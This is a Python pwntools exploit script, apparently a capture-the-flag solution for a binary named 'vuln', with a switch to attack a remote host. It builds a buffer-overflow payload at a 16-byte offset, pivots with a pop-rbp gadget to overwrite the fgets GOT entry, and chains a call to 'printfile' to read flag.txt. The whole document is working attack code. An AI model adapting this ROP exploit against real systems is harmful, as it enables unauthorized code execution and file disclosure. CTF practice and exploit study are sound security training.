#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+38
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():

    offset = 16
    pop_rbp = 0x000000000040111d # pop rbp; ret;
    call_fgets =  0x0000000000401142

    payload = flat({
        offset: [
            pop_rbp,
            exe.got['fgets'] + 8,
            call_fgets
        ]
    })

    io.sendline(payload)

    rop = flat([
        exe.sym['printfile'],
        0x0,
        pop_rbp,
        exe.got['fgets'] + 0x30,
        call_fgets,
        b"flag.txt",
        0x0
    ])

    io.sendline(rop)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

